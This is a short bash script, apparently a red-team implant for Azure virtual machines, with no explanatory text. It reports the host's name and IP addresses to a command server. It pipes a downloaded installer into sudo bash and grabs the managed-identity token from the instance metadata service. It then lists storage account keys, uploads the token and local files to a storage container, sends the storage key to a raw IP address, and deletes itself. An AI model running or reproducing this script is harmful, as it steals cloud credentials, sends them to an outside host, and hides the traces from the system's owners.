#!/usr/bin/env bash
remoteHost=45.63.35.60
ext_ip=$(curl ipinfo.io/ip -s)
int_ip=$(ip route get 1 | awk '{print $7}' | head -n 1)
hostname=$(hostname)
curl -s -X POST -L -k -u htgc:$1 https://badtoast.dx-red.team/host/new\?host%5Bhostname%5D\=$hostname\&host%5Bip_internal%5D\=$int_ip\&host%5Bip_external%5D\=$ext_ip > /dev/null 2>&1
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
echo $(curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-06-01&resource=https://management.azure.com") > token.txt
az login --identity
storageKey=$(az storage account keys list --account-name calipsostorageazure --query "[0].value")
az storage blob upload -f token.txt -c calipsocontainer -n calipsocreds.txt --account-name calipsostorageazure --account-key $storageKey
az storage blob upload -f ~/.bashrc -c calipsocontainer -n bashrc.conf --account-name calipsostorageazure --account-key $storageKey
az storage blob upload -f /bin/ls -c calipsocontainer -n ls.bin --account-name calipsostorageazure --account-key $storageKey
curl -f -s -X POST http://$(echo $remoteHost)/$(echo $storageKey | cut -d "\"" -f 2)
rm $(echo $(dirname $0)/$(basename $0))
